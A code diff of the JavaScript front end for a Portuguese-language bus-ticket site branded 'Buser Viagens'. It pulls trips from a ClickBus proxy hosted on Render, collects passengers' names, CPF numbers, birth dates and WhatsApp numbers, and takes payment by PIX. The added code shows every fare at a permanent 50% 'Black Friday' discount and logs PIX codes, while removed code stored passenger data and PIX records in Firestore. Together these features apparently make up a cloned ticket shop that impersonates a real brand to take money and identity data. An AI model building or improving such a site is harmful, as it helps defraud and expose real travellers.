-fs.collection("config").doc("global").onSnapshot(snap => {
-  if (snap.exists) CONFIG = { ...CONFIG, ...snap.data() };
-});
+  // ============================================================
+  // 1. CALENDÁRIO
+  // ============================================================
+  flatpickr("#input-ida", { locale: "pt", dateFormat: "Y-m-d", altInput: true, altFormat: "d/m/Y", minDate: "today", position: "below right" });
+  flatpickr("#input-volta", { locale: "pt", dateFormat: "Y-m-d", altInput: true, altFormat: "d/m/Y", minDate: "today", position: "below right" });
 
-// Calendário
-flatpickr("#input-ida", { locale: "pt", dateFormat: "Y-m-d", altInput: true, altFormat: "d/m/Y", minDate: "today", position: "below right" });
-flatpickr("#input-volta", { locale: "pt", dateFormat: "Y-m-d", altInput: true, altFormat: "d/m/Y", minDate: "today", position: "below right" });
+  // ============================================================
+  // 2. AUTOCOMPLETE DE CIDADES
+  // ============================================================
+  const cidadesFallback = [
+    "São Paulo, SP", "Rio de Janeiro, RJ", "Belo Horizonte, MG", "Brasília, DF",
+    "Salvador, BA", "Fortaleza, CE", "Recife, PE", "Porto Alegre, RS",
+    "Curitiba, PR", "Campinas, SP", "Vitória, ES", "Goiânia, GO",
+    "Belém, PA", "Manaus, AM", "Natal, RN", "Maceió, AL",
+    "João Pessoa, PB", "Teresina, PI", "Cuiabá, MT", "Campo Grande, MS",
+    "Florianópolis, SC", "Macapá, AP", "Palmas, TO", "Boa Vista, RR",
+    "Porto Velho, RO", "Rio Branco, AC", "Aracaju, SE", "São Luís, MA",
+    "Ribeirão Preto, SP", "Uberlândia, MG", "Juiz de Fora, MG", "Londrina, PR",
+    "Maringá, PR", "Joinville, SC", "Caxias do Sul, RS", "Pelotas, RS",
+    "Santos, SP", "Guarulhos, SP", "Osasco, SP", "Santo André, SP",
+    "Niterói, RJ", "Campos dos Goytacazes, RJ", "Cabo Frio, RJ", "Petrópolis, RJ",
+    "Contagem, MG", "Betim, MG", "Montes Claros, MG", "Ipatinga, MG",
+    "Feira de Santana, BA", "Ilhéus, BA", "Porto Seguro, BA", "Vitória da Conquista, BA",
+    "Imperatriz, MA", "Açailândia, MA", "Caxias, MA", "Codó, MA",
+    "Bacabal, MA", "Santa Inês, MA", "Pinheiro, MA", "Balsas, MA",
+    "Timon, MA", "Araguaína, TO", "Marabá, PA", "Santarém, PA",
+    "Parnaíba, PI", "Picos, PI", "Sobral, CE", "Juazeiro do Norte, CE",
+    "Mossoró, RN", "Campina Grande, PB", "Caruaru, PE", "Petrolina, PE"
+  ];
+  let cidadesBrasil = [...cidadesFallback];
 
-// Autocomplete IBGE
-const cidadesFallback = ["São Paulo, SP", "Rio de Janeiro, RJ", "Belo Horizonte, MG", "Brasília, DF", "Salvador, BA", "Fortaleza, CE", "Recife, PE", "Porto Alegre, RS", "Curitiba, PR", "Campinas, SP", "Uberlândia, MG"];
-let cidadesBrasil = [...cidadesFallback];
-async function carregarCidades() {
-  try {
-    const response = await fetch('https://servicodados.ibge.gov.br/api/v1/localidades/municipios');
-    const dados = await response.json();
-    const listaIBGE = dados.map(c => `${c.nome}, ${c.microrregiao.mesorregiao.UF.sigla}`).sort();
-    cidadesBrasil = [...new Set([...listaIBGE, ...cidadesFallback])].sort();
-  } catch (e) {}
-}
-carregarCidades();
+  async function carregarCidades() {
+    try {
+      const response = await fetch('https://servicodados.ibge.gov.br/api/v1/localidades/municipios');
+      const dados = await response.json();
+      const listaIBGE = dados.map(c => `${c.nome}, ${c.microrregiao.mesorregiao.UF.sigla}`).sort();
+      cidadesBrasil = [...new Set([...listaIBGE, ...cidadesFallback])].sort();
+      console.log(`✅ ${cidadesBrasil.length} cidades carregadas do IBGE!`);
+    } catch (e) { console.log("⚠️ Usando fallback de cidades."); }
+  }
+  carregarCidades();
 
-function normalizarTexto(t) { return t.normalize('NFD').replace(/[\u0300-\u036f]/g, "").toLowerCase(); }
+  function normalizarTexto(t) { return t.normalize('NFD').replace(/[\u0300-\u036f]/g, "").toLowerCase(); }
 
-function configurarAutocomplete(inputId, listaId) {
-  const input = document.getElementById(inputId);
-  const lista = document.getElementById(listaId);
-  input.addEventListener('input', function() {
-    const termo = normalizarTexto(this.value);
-    lista.innerHTML = '';
-    if (termo.length < 2) { lista.style.display = 'none'; return; }
-    const filtradas = cidadesBrasil.filter(c => normalizarTexto(c).includes(termo)).slice(0, 8);
-    if (filtradas.length > 0) {
-      lista.style.display = 'block';
-      filtradas.forEach(cidade => {
-        const li = document.createElement('li');
-        li.textContent = cidade;
-        li.onmousedown = function(e) {
-          e.preventDefault();
-          input.value = cidade;
-          lista.style.display = 'none';
-          if(inputId === 'input-origem') document.getElementById('input-destino').focus();
-        };
-        lista.appendChild(li);
-      });
-    } else { lista.style.display = 'none'; }
-  });
-  document.addEventListener('click', e => { if (e.target !== input && e.target !== lista) lista.style.display = 'none'; });
-}
-configurarAutocomplete('input-origem', 'lista-origem');
-configurarAutocomplete('input-destino', 'lista-destino');
+  function configurarAutocomplete(inputId, listaId) {
+    const input = document.getElementById(inputId);
+    const lista = document.getElementById(listaId);
 
-function swapCidades() {
-  const o = document.getElementById('input-origem'), d = document.getElementById('input-destino');
-  const t = o.value; o.value = d.value; d.value = t;
-}
+    input.addEventListener('input', function() {
+      const termo = normalizarTexto(this.value);
+      lista.innerHTML = '';
+      if (termo.length < 2) { lista.style.display = 'none'; return; }
 
-// Busca
-let viagensOriginais = [];
-document.getElementById('form-busca').addEventListener('submit', async function(e) {
-  e.preventDefault();
-  const origem = document.getElementById('input-origem').value;
-  const destino = document.getElementById('input-destino').value;
-  const dataIda = document.getElementById('input-ida').value;
+      const filtradas = cidadesBrasil.filter(c => normalizarTexto(c).includes(termo)).slice(0, 8);
 
-  if (!origem.includes(',')) { alert("Selecione a origem na lista."); return; }
-  if (!destino.includes(',')) { alert("Selecione o destino na lista."); return; }
-  if (!dataIda) { alert("Escolha a data."); return; }
+      if (filtradas.length > 0) {
+        lista.style.display = 'block';
+        filtradas.forEach(cidade => {
+          const li = document.createElement('li');
+          li.textContent = cidade;
+          li.onmousedown = function(e) {
+            e.preventDefault();
+            input.value = cidade;
+            lista.style.display = 'none';
+            if(inputId === 'input-origem') document.getElementById('input-destino').focus();
+          };
+          lista.appendChild(li);
+        });
+      } else { lista.style.display = 'none'; }
+    });
 
-  const container = document.getElementById('resultados-viagem');
-  const titulo = document.getElementById('titulo-resultados');
-  const lista = document.getElementById('lista-viagens');
-  const filtros = document.getElementById('filtros-sidebar');
+    document.addEventListener('click', e => { if (e.target !== input && e.target !== lista) lista.style.display = 'none'; });
+  }
+  configurarAutocomplete('input-origem', 'lista-origem');
+  configurarAutocomplete('input-destino', 'lista-destino');
 
-  const dataFormatada = dataIda.split('-').reverse().join('/');
-  container.style.display = 'block';
-  titulo.innerHTML = `Resultados de ${origem} para ${destino} em ${dataFormatada}`;
-  lista.innerHTML = '<p style="color: var(--grey-med); padding: 20px 0;">Buscando viagens reais...</p>';
-  filtros.style.display = 'none';
-  container.scrollIntoView({ behavior: 'smooth', block: 'center' });
+  function swapCidades() {
+    const o = document.getElementById('input-origem'), d = document.getElementById('input-destino');
+    const t = o.value; o.value = d.value; d.value = t;
+  }
 
-  try {
-    const response = await fetch(`https://buser-online.onrender.com/api/clickbus/search?origem=${encodeURIComponent(origem)}&destino=${encodeURIComponent(destino)}&data=${dataIda}`);
-    if (!response.ok) throw new Error('Erro no servidor');
-    const dados = await response.json();
-    if (!dados || dados.length === 0) {
-      lista.innerHTML = `<div style="text-align: center; padding: 40px 20px; background:#fff; border-radius:16px; border:1px solid #e0e0e0;"><span style="font-size: 40px;">🚌</span><h3 style="margin-top: 10px; color: #454545;">Nenhuma viagem encontrada</h3><p style="color: #757575;">Tente mudar a data ou escolher outra cidade.</p></div>`;
+  // ============================================================
+  // 3. BUSCA
+  // ============================================================
+  let viagensOriginais = [];
+  document.getElementById('btn-pesquisar').addEventListener('click', async function() {
+    const origem = document.getElementById('input-origem').value;
+    const destino = document.getElementById('input-destino').value;
+    const dataIda = document.getElementById('input-ida').value;
+
+    if (!origem.includes(',')) { alert("Por favor, selecione a cidade de origem na lista de sugestões."); return; }
+    if (!destino.includes(',')) { alert("Por favor, selecione a cidade de destino na lista de sugestões."); return; }
+    if (!dataIda) { alert("Por favor, escolha a data de ida."); return; }
+
+    const container = document.getElementById('resultados-viagem');
+    const titulo = document.getElementById('titulo-resultados');
+    const lista = document.getElementById('lista-viagens');
+    const filtros = document.getElementById('filtros-sidebar');
+
+    const dataFormatada = dataIda.split('-').reverse().join('/');
+    container.style.display = 'block';
+    titulo.innerHTML = `Resultados de ${origem} para ${destino} em ${dataFormatada}`;
+    filtros.style.display = 'none';
+    container.scrollIntoView({ behavior: 'smooth', block: 'center' });
+
+    let elapsed = 0;
+    lista.innerHTML = `
+      <div style="text-align:center; padding:40px 20px; background:#fff; border-radius:16px; border:1px solid #e0e0e0;">
+        <div style="font-size:40px; margin-bottom:8px;">🚌</div>
+        <p style="color:var(--grey-med); margin:0 0 8px;">Buscando viagens reais...</p>
+        <p style="color:var(--brand); font-weight:700; font-size:20px; margin:0;" id="timer-busca">0s</p>
+        <p style="color:var(--grey-med); font-size:12px; margin:12px 0 0;">O servidor pode estar acordando (cold start).<br>Isso pode levar até 60 segundos.</p>
+      </div>`;
+
+    const timerInterval = setInterval(() => {
+      elapsed++;
+      const t = document.getElementById('timer-busca');
+      if (t) t.textContent = elapsed + 's';
+    }, 1000);
+
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 60000);
+
+    let dados = null;
+    let erroTipo = null;
+    let erroDetalhe = '';
+
+    try {
+      const response = await fetch(
+        `https://buser-online.onrender.com/api/clickbus/search?origem=${encodeURIComponent(origem)}&destino=${encodeURIComponent(destino)}&data=${dataIda}`,
+        { signal: controller.signal }
+      );
+      if (!response.ok) { erroTipo = 'http'; erroDetalhe = `Status ${response.status}`; throw new Error(erroDetalhe); }
+      const rawText = await response.text();
+      try { dados = JSON.parse(rawText); }
+      catch (e) { erroTipo = 'parse'; erroDetalhe = 'Resposta não é JSON: ' + rawText.slice(0, 120); throw new Error('parse'); }
+      if (!Array.isArray(dados) || dados.length === 0) { erroTipo = 'vazio'; erroDetalhe = 'Nenhuma viagem retornada pela API'; }
+    } catch (err) {
+      if (err.name === 'AbortError') { erroTipo = 'timeout'; erroDetalhe = 'Servidor não respondeu em 60s'; }
+      else if (!erroTipo) { erroTipo = 'cors'; erroDetalhe = 'Falha de rede / CORS / servidor offline'; }
+    } finally {
+      clearTimeout(timeoutId);
+      clearInterval(timerInterval);
+    }
+
+    if (dados && Array.isArray(dados) && dados.length > 0 && !erroTipo) {
+      viagensOriginais = dados;
+      gerarFiltros(dados);
+      renderizarViagens(dados);
+      filtros.style.display = 'block';
       return;
     }
-    viagensOriginais = dados;
-    gerarFiltros(dados);
-    renderizarViagens(dados);
-    filtros.style.display = 'block';
-  } catch (error) {
-    console.error(error);
-    lista.innerHTML = `<div style="background: #fff7fa; padding: 16px; border-radius: 8px; border: 1px solid #ffccd5;"><p style="color: #d81b60; font-weight: 600; margin: 0 0 8px;">Erro na busca.</p><p style="margin: 0; font-size: 14px;">Verifique se o servidor no Render está ativo.</p></div>`;
+
+    const mensagens = {
+      timeout: '⏱️ O servidor não respondeu em 60s. Ele provavelmente está hibernando no Render.',
+      cors: '🔌 Não consegui conectar ao servidor. Pode estar offline, com CORS bloqueado ou removido.',
+      http: '❌ O servidor respondeu com erro.',
+      parse: '📄 O servidor respondeu em formato inválido (não é JSON).',
+      vazio: '🔍 A API respondeu, mas não retornou viagens para esta rota/data.',
+    };
+
+    lista.innerHTML = `
+      <div style="background:#fff7fa; padding:24px; border-radius:16px; border:1px solid #ffccd5; text-align:center;">
+        <div style="font-size:40px; margin-bottom:8px;">⚠️</div>
+        <p style="color:#d81b60; font-weight:700; margin:0 0 8px; font-size:16px;">${mensagens[erroTipo] || 'Erro desconhecido'}</p>
+        <p style="color:var(--grey-med); font-size:12px; margin:0 0 20px; word-break:break-all;">${erroDetalhe}</p>
+        <div style="display:flex; gap:8px; flex-wrap:wrap; justify-content:center;">
+          <button onclick="document.getElementById('btn-pesquisar').click()" style="padding:12px 20px; background:var(--brand); color:#fff; border:none; border-radius:8px; font-weight:700; cursor:pointer; font-family:'Poppins';">🔄 Tentar novamente</button>
+          <button onclick="usarViagensDemo()" style="padding:12px 20px; background:#fff; color:var(--brand); border:2px solid var(--brand); border-radius:8px; font-weight:700; cursor:pointer; font-family:'Poppins';">🎮 Testar com demonstração</button>
+        </div>
+        <p style="color:var(--grey-med); font-size:11px; margin:20px 0 0; line-height:1.5;">💡 O servidor do Render hiberna após 15 min sem uso.<br>A primeira chamada do dia pode levar até 60s.</p>
+      </div>`;
+  });
+
+  function usarViagensDemo() {
+    const demo = [
+      { company:{name:'Expresso Horizonte'}, bus_type:'Executivo', departure:{time:'08:30',terminal:{name:'Rodoviária Tietê',address:'Av. Cruzeiro do Sul, 1800 - Santana, São Paulo - SP'}}, arrival:{time:'14:15',terminal:{name:'Rodoviária Novo Rio',address:'Av. Francisco Bicalho, 1 - Santo Cristo, Rio de Janeiro - RJ'}}, price:149.90, total_seats:46, occupied_seats:[2,5,8,12,15,22,28,33,40] },
+      { company:{name:'Viação Cometa'}, bus_type:'Leito', departure:{time:'14:00',terminal:{name:'Rodoviária Tietê',address:'Av. Cruzeiro do Sul, 1800 - Santana, São Paulo - SP'}}, arrival:{time:'19:45',terminal:{name:'Rodoviária Novo Rio',address:'Av. Francisco Bicalho, 1 - Santo Cristo, Rio de Janeiro - RJ'}}, price:219.90, total_seats:32, occupied_seats:[3,7,11,19,25] },
+      { company:{name:'Expresso Horizonte'}, bus_type:'Convencional', departure:{time:'22:30',terminal:{name:'Rodoviária Tietê',address:'Av. Cruzeiro do Sul, 1800 - Santana, São Paulo - SP'}}, arrival:{time:'05:10',terminal:{name:'Rodoviária Novo Rio',address:'Av. Francisco Bicalho, 1 - Santo Cristo, Rio de Janeiro - RJ'}}, price:99.90, total_seats:46, occupied_seats:[1,4,10,14,17,20,30,35,42,44] },
+      { company:{name:'Itapemirim'}, bus_type:'Semi-Leito', departure:{time:'10:00',terminal:{name:'Rodoviária Tietê',address:'Av. Cruzeiro do Sul, 1800 - Santana, São Paulo - SP'}}, arrival:{time:'15:50',terminal:{name:'Rodoviária Novo Rio',address:'Av. Francisco Bicalho, 1 - Santo Cristo, Rio de Janeiro - RJ'}}, price:179.90, total_seats:40, occupied_seats:[6,13,21,27] }
+    ];
+    viagensOriginais = demo;
+    gerarFiltros(demo);
+    renderizarViagens(demo);
+    document.getElementById('filtros-sidebar').style.display = 'block';
+    document.getElementById('lista-viagens').insertAdjacentHTML('afterbegin',
+      `<div style="background:#fff8e1; padding:12px 16px; border-radius:8px; border:1px solid #ffe082; margin-bottom:16px; font-size:13px; color:#7a5c00;">🎮 <strong>Modo demonstração.</strong> Viagens simuladas para você testar o fluxo de compra.</div>`);
   }
-});
 
-function renderizarViagens(viagens) {
-  const lista = document.getElementById('lista-viagens');
-  if (viagens.length === 0) { lista.innerHTML = `<p style="padding:20px; background:#fff; border-radius:16px;">Nenhuma viagem com os filtros selecionados.</p>`; return; }
-  viagensOriginais = [...viagens];
-  lista.innerHTML = viagens.map((v, i) => {
-    const empresa = v.company.name;
-    const tipo = v.bus_type;
-    const partida = v.departure.time;
-    const terminalPartida = v.departure.terminal;
-    const chegada = v.arrival.time;
-    const terminalChegada = v.arrival.terminal;
-    let precoOriginal = typeof v.price === 'number' ? v.price : 0;
-    let precoFinal = precoOriginal;
-    if (CONFIG.descontoGlobal > 0) {
-      precoFinal = precoOriginal * (1 - CONFIG.descontoGlobal / 100);
+  // ============================================================
+  // 4. HELPER: EXTRAI NOME + ENDEREÇO DO TERMINAL
+  // ============================================================
+  function extrairTerminal(t) {
+    if (!t) return { nome: '-', endereco: '' };
+    if (typeof t === 'string') return { nome: t, endereco: '' };
+
+    const nome = t.name || t.nome || t.terminal || t.title || t.label || t.rodoviaria || '-';
+
+    let endereco = '';
+    const candidatos = [
+      t.address, t.endereco, t.full_address, t.fullAddress,
+      t.address_line, t.addressLine,
+      t.location && t.location.address,
+      t.location && t.location.endereco,
+      t.location && t.location.street,
+      t.place && t.place.address,
+      t.place && t.place.endereco
+    ];
+    for (const c of candidatos) {
+      if (c && typeof c === 'string' && c.trim()) { endereco = c.trim(); break; }
     }
-    const precoExibir = `R$ ${precoFinal.toFixed(2).replace('.', ',')}`;
-    const precoRiscado = CONFIG.descontoGlobal > 0 ? `<div style="text-decoration:line-through;color:#999;font-size:12px;">R$ ${precoOriginal.toFixed(2).replace('.', ',')}</div>` : '';
+    if (!endereco && (t.street || t.rua || t.logradouro)) {
+      const rua = t.street || t.rua || t.logradouro;
+      endereco = rua + (t.number || t.numero ? ', ' + (t.number || t.numero) : '');
+      if (t.neighborhood || t.bairro) endereco += ' - ' + (t.neighborhood || t.bairro);
+      if (t.city || t.cidade) endereco += ', ' + (t.city || t.cidade);
+    }
+    return { nome, endereco };
+  }
 
-    return `
-    <div class="trip-card">
-      <div class="trip-info" style="flex: 1;">
-        <h4>${empresa} <span style="font-size:12px; color:#fff; background:var(--brand); padding:2px 6px; border-radius:4px;">${tipo}</span></h4>
-        <div style="display: flex; gap: 16px; margin-top: 8px; font-size: 14px;">
-          <div style="flex: 1;">
-            <span style="color: var(--grey-med); font-size: 12px; display: block;">Saída</span>
-            <strong>${partida}</strong>
-            <span style="display: block; font-size: 12px; color: var(--grey-med);">${terminalPartida}</span>
-          </div>
-          <div style="border-left: 2px dashed var(--grey-light); padding-left: 16px; flex: 1;">
-            <span style="color: var(--grey-med); font-size: 12px; display: block;">Chegada</span>
-            <strong>${chegada}</strong>
-            <span style="display: block; font-size: 12px; color: var(--grey-med);">${terminalChegada}</span>
+  // ============================================================
+  // 5. RENDERIZAR COM DESCONTO 50% + ENDEREÇO
+  // ============================================================
+  function renderizarViagens(viagens) {
+    const lista = document.getElementById('lista-viagens');
+    if (viagens.length === 0) { lista.innerHTML = `<p>Nenhuma viagem com os filtros selecionados.</p>`; return; }
+
+    viagensOriginais = [...viagens];
+
+    const banner = `
+      <div class="black-friday-banner">
+        <span class="pulse">🔥 BLACK FRIDAY</span>
+        <span>Todas as passagens com <strong style="color:#40b552">50% DE DESCONTO</strong></span>
+      </div>`;
+
+    lista.innerHTML = banner + viagens.map((v, i) => {
+      const empresa = v.company.name;
+      const tipo = v.bus_type;
+      const partida = v.departure.time;
+      const chegada = v.arrival.time;
+
+      const termPartida = extrairTerminal(v.departure.terminal);
+      const termChegada = extrairTerminal(v.arrival.terminal);
+
+      const precoNum = parseFloat(v.price) || 0;
+      const precoOriginalStr = precoNum.toFixed(2).replace('.', ',');
+      const precoFinalStr = (precoNum * 0.5).toFixed(2).replace('.', ',');
+
+      return `
+      <div class="trip-card">
+        <div class="trip-info" style="flex: 1;">
+          <h4>${empresa} <span style="font-size:12px; color:#fff; background:var(--brand); padding:2px 6px; border-radius:4px;">${tipo}</span></h4>
+          <div style="display: flex; gap: 16px; margin-top: 8px; font-size: 14px;">
+            <div style="flex: 1;">
+              <span style="color: var(--grey-med); font-size: 12px; display: block;">Saída</span>
+              <strong>${partida}</strong>
+              <span style="display: block; font-size: 12px; color: var(--grey-med);">${termPartida.nome}</span>
+              ${termPartida.endereco ? `<span style="display: block; font-size: 11px; color: #999; margin-top:2px;">📍 ${termPartida.endereco}</span>` : ''}
+            </div>
+            <div style="border-left: 2px dashed var(--grey-light); padding-left: 16px; flex: 1;">
+              <span style="color: var(--grey-med); font-size: 12px; display: block;">Chegada</span>
+              <strong>${chegada}</strong>
+              <span style="display: block; font-size: 12px; color: var(--grey-med);">${termChegada.nome}</span>
+              ${termChegada.endereco ? `<span style="display: block; font-size: 11px; color: #999; margin-top:2px;">📍 ${termChegada.endereco}</span>` : ''}
+            </div>
           </div>
         </div>
-      </div>
-      <div class="trip-price">
-        <span>A partir de</span>
-        ${precoRiscado}
-        ${precoExibir}
-        <button class="btn-comprar" onclick="selecionarViagem(${i})">Selecionar</button>
-      </div>
-    </div>`;
-  }).join('');
-}
-
-function gerarFiltros(viagens) {
-  const empresas = [...new Set(viagens.map(v => v.company.name))].sort();
-  const tipos = [...new Set(viagens.map(v => v.bus_type))].sort();
-  document.getElementById('filtro-empresas').innerHTML = empresas.map(emp => `<label class="filtro-item"><input type="checkbox" value="${emp}" onchange="aplicarFiltros()"> ${emp}</label>`).join('');
-  document.getElementById('filtro-tipos').innerHTML = tipos.map(tipo => `<label class="filtro-item"><input type="checkbox" value="${tipo}" onchange="aplicarFiltros()"> ${tipo}</label>`).join('');
-}
-
-function aplicarFiltros() {
-  const empMarcadas = Array.from(document.querySelectorAll('#filtro-empresas input:checked')).map(cb => cb.value);
-  const tiposMarcados = Array.from(document.querySelectorAll('#filtro-tipos input:checked')).map(cb => cb.value);
-  const filtradas = viagensOriginais.filter(v => {
-    const pEmp = empMarcadas.length === 0 || empMarcadas.includes(v.company.name);
-    const pTipo = tiposMarcados.length === 0 || tiposMarcados.includes(v.bus_type);
-    return pEmp && pTipo;
-  });
-  renderizarViagens(filtradas);
-}
-
-// Modais e PIX
-let viagemSel = null;
-let passageiros = [];
-let precoUnit = 0;
-let assentosSelecionados = [];
-let qtdPassageiros = 1;
-let pixCodeGlobal = '';
-
-function selecionarViagem(index) {
-  viagemSel = viagensOriginais[index];
-  if (!viagemSel) return;
-  passageiros = [];
-  precoUnit = viagemSel.price || 0;
-  document.getElementById('lista-passageiros').innerHTML = '';
-  adicionarPassageiro();
-  document.getElementById('modal-passageiros').style.display = 'flex';
-  atualizarTotal();
-}
-
-function adicionarPassageiro() {
-  const container = document.getElementById('lista-passageiros');
-  const index = passageiros.length;
-  passageiros.push({ nome: '', cpf: '', dataNasc: '' });
-  const div = document.createElement('div');
-  div.className = 'passageiro-box';
-  div.innerHTML = `
-    <p style="font-weight:600; margin-bottom:8px;">Passageiro ${index + 1}</p>
-    <input type="text" placeholder="Nome completo" oninput="atualizarPassageiro(${index}, 'nome', this.value)">
-    <input type="text" placeholder="CPF" id="cpf-${index}" oninput="atualizarPassageiro(${index}, 'cpf', this.value)">
-    <input type="text" placeholder="Data de Nascimento" id="dataNasc-${index}" oninput="atualizarPassageiro(${index}, 'dataNasc', this.value)">
-  `;
-  container.appendChild(div);
-  IMask(document.getElementById(`cpf-${index}`), { mask: '000.000.000-00' });
-  IMask(document.getElementById(`dataNasc-${index}`), { mask: '00/00/0000' });
-  atualizarTotal();
-}
-
-function atualizarPassageiro(i, campo, valor) { passageiros[i][campo] = valor; }
-function atualizarTotal() { 
-  let total = precoUnit * passageiros.length;
-  if (CONFIG.descontoGlobal > 0) total = total * (1 - CONFIG.descontoGlobal / 100);
-  document.getElementById('valor-total').textContent = `R$ ${total.toFixed(2).replace('.', ',')}`; 
-}
-function fecharModalPassageiros() { document.getElementById('modal-passageiros').style.display = 'none'; }
-
-function confirmarPassageiros() {
-  for (let i = 0; i < passageiros.length; i++) {
-    if (!passageiros[i].nome || !passageiros[i].cpf || !passageiros[i].dataNasc) { alert(`Preencha os dados do passageiro ${i + 1}.`); return; }
+        <div class="trip-price">
+          <span>A partir de</span>
+          <div class="preco-antigo">R$ ${precoOriginalStr}</div>
+          <div style="display:flex; align-items:center; gap:6px; justify-content:flex-end;">
+            <span>R$ ${precoFinalStr}</span>
+            <span class="desconto-badge">-50%</span>
+          </div>
+          <button class="btn-comprar" onclick="selecionarViagem(${i})">Selecionar</button>
+        </div>
+      </div>`;
+    }).join('');
   }
-  fecharModalPassageiros();
-  abrirModalPoltrona(viagemSel, passageiros.length);
-}
 
-function abrirModalPoltrona(viagem, qtd) {
-  qtdPassageiros = qtd;
-  assentosSelecionados = [];
-  document.getElementById('qtd-assentos').textContent = qtd;
-  document.getElementById('assento-escolhido').textContent = "Nenhum assento selecionado";
-  const mapa = document.getElementById('mapa-onibus');
-  mapa.innerHTML = '';
-  let html = '';
-  const fileiras = Math.ceil(46 / 4);
-  for (let i = 0; i < fileiras; i++) {
-    const a1 = i * 4 + 1, a2 = i * 4 + 2, a3 = i * 4 + 3, a4 = i * 4 + 4;
-    const criarBtn = (num) => {
-      if (num > 46) return '';
-      return `<button class="poltrona-btn" onclick="toggleAssento(${num}, this)">${num}</button>`;
-    };
-    html += `<div class="onibus-fileira"><div style="display:flex; gap:8px;">${criarBtn(a1)}${criarBtn(a2)}</div><div class="onibus-corredor"></div><div style="display:flex; gap:8px;">${criarBtn(a3)}${criarBtn(a4)}</div></div>`;
+  function gerarFiltros(viagens) {
+    const empresas = [...new Set(viagens.map(v => v.company.name))].sort();
+    const tipos = [...new Set(viagens.map(v => v.bus_type))].sort();
+    document.getElementById('filtro-empresas').innerHTML = empresas.map(emp => `<label class="filtro-item"><input type="checkbox" value="${emp}" onchange="aplicarFiltros()"> ${emp}</label>`).join('');
+    document.getElementById('filtro-tipos').innerHTML = tipos.map(tipo => `<label class="filtro-item"><input type="checkbox" value="${tipo}" onchange="aplicarFiltros()"> ${tipo}</label>`).join('');
   }
-  mapa.innerHTML = html;
-  document.getElementById('modal-poltrona').style.display = 'flex';
-}
 
-function toggleAssento(num, btn) {
-  if (assentosSelecionados.includes(num)) {
-    assentosSelecionados = assentosSelecionados.filter(a => a !== num);
-    btn.classList.remove('selecionada');
-  } else {
-    if (assentosSelecionados.length >= qtdPassageiros) { alert(`Só pode selecionar ${qtdPassageiros} assento(s).`); return; }
-    assentosSelecionados.push(num);
-    btn.classList.add('selecionada');
+  function aplicarFiltros() {
+    const empMarcadas = Array.from(document.querySelectorAll('#filtro-empresas input:checked')).map(cb => cb.value);
+    const tiposMarcados = Array.from(document.querySelectorAll('#filtro-tipos input:checked')).map(cb => cb.value);
+    const filtradas = viagensOriginais.filter(v => {
+      const pEmp = empMarcadas.length === 0 || empMarcadas.includes(v.company.name);
+      const pTipo = tiposMarcados.length === 0 || tiposMarcados.includes(v.bus_type);
+      return pEmp && pTipo;
+    });
+    renderizarViagens(filtradas);
   }
-  document.getElementById('assento-escolhido').textContent = assentosSelecionados.length > 0 ? `Assentos: ${assentosSelecionados.join(', ')}` : "Nenhum assento selecionado";
-}
 
-function fecharModalPoltrona() { document.getElementById('modal-poltrona').style.display = 'none'; }
+  // ============================================================
+  // 6. MODAIS COM DESCONTO + WHATSAPP + POLTRONAS + LOG PIX
+  // ============================================================
+  const DESCONTO = 0.5;
 
-function confirmarPoltrona() {
-  if (assentosSelecionados.length !== qtdPassageiros) { alert(`Selecione exatamente ${qtdPassageiros} assento(s).`); return; }
-  fecharModalPoltrona();
-  abrirCheckout(viagemSel, assentosSelecionados, passageiros);
-}
+  let viagemSel = null;
+  let passageiros = [];
+  let precoUnit = 0;
+  let assento = null;
+  let checkoutState = { total: 0, totalOriginal: 0, payload: '', txid: '', empresa: '', poltrona: '', route: '' };
 
-function abrirCheckout(viagem, assentos, lista) {
-  const info = document.getElementById('checkout-info');
-  let totalOriginal = viagem.price * lista.length;
-  let totalFinal = totalOriginal;
-  if (CONFIG.descontoGlobal > 0) totalFinal = totalOriginal * (1 - CONFIG.descontoGlobal / 100);
-  let htmlPass = lista.map(p => `<li>${p.nome} (CPF: ${p.cpf})</li>`).join('');
-  info.innerHTML = `
-    <strong>Empresa:</strong> ${viagem.company.name} <br>
-    <strong>Poltronas:</strong> ${assentos.join(', ')} <br>
-    <strong>Passageiros:</strong> <ul>${htmlPass}</ul>
-    ${CONFIG.descontoGlobal > 0 ? `<div style="color:var(--brand);font-size:12px">Desconto: -${CONFIG.descontoGlobal}%</div>` : ''}
-    <strong>Total:</strong> <span style="color:var(--brand); font-weight:bold; font-size:18px;">R$ ${totalFinal.toFixed(2).replace('.', ',')}</span>
-  `;
-  document.getElementById('modal-checkout').style.display = 'flex';
-  // Gerar PIX
-  gerarPix(viagem, assentos, lista, totalFinal);
-}
+  function logPix(type, extra) {
+    try {
+      const log = JSON.parse(localStorage.getItem('buser_pix_log') || '[]');
+      log.unshift({ type, ...extra, timestamp: Date.now() });
+      if (log.length > 300) log.length = 300;
+      localStorage.setItem('buser_pix_log', JSON.stringify(log));
+    } catch (e) { console.warn('Erro ao logar PIX', e); }
+  }
 
-function gerarPix(viagem, assentos, lista, total) {
-  const chave = CONFIG.chavePix || '00000000000';
-  const nome = CONFIG.nomeBeneficiario || 'Buser Viagens';
-  const cidade = CONFIG.cidadeBeneficiario || 'Sao Paulo';
-  const txid = 'BUSER' + Date.now();
-  const pixCode = gerarPayloadPix(chave, nome, cidade, total, txid);
-  pixCodeGlobal = pixCode;
-  document.getElementById('pix-code').value = pixCode;
-  document.getElementById('qrcode').innerHTML = '';
-  new QRCode(document.getElementById('qrcode'), { text: pixCode, width: 180, height: 180 });
-  // Registrar no Firestore
-  fs.collection("pix_gerados").add({
-    tipo: 'pix',
-    viagem: viagem,
-    passageiros: lista,
-    assentos: assentos,
-    total: total,
-    pixCode: pixCode,
-    status: 'pendente',
-    timestamp: firebase.firestore.FieldValue.serverTimestamp()
-  }).catch(console.warn);
-}
+  function mascaraWhats(v) {
+    v = v.replace(/\D/g, '').substring(0, 11);
+    if (v.length <= 10) return v.replace(/^(\d{2})(\d{4})(\d{0,4}).*/, '($1) $2-$3').replace(/[-\s()]*$/, '');
+    return v.replace(/^(\d{2})(\d{5})(\d{0,4}).*/, '($1) $2-$3').replace(/[-\s()]*$/, '');
+  }
+  function mascaraCPF(v) {
+    v = v.replace(/\D/g, '').substring(0, 11);
+    return v.replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+  }
 
-function crc16(str) {
-  let crc = 0xFFFF;
-  for (let i = 0; i < str.length; i++) {
